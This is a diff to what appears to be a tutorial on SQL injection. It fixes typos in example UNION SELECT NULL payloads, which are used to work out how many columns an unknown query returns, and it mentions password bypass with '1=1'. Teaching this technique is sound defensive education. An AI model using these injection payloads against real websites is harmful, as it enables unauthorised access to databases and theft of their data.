@@ -189,9 +189,9 @@ Login without password on a website that do not encrypt passwords. The `1=1` is,
 ```sql
 -- you don't known the query
 SELECT [...] UNION SELECT NULL -- fail
-SELECT [...] UNION SELECT NULL, NULl -- fail
-SELECT [...] UNION SELECT NULL, NULl, NULl -- fail
-SELECT [...] UNION SELECT NULL, NULl, NULl, NULL -- OK
+SELECT [...] UNION SELECT NULL, NULL -- fail
+SELECT [...] UNION SELECT NULL, NULL, NULL -- fail
+SELECT [...] UNION SELECT NULL, NULL, NULL, NULL -- OK
 ```
 
 In the case above, we know that there are 4 attributes in the select, even if we don't know which ones! Once we found the tables/column names, we will use that to fetch data.
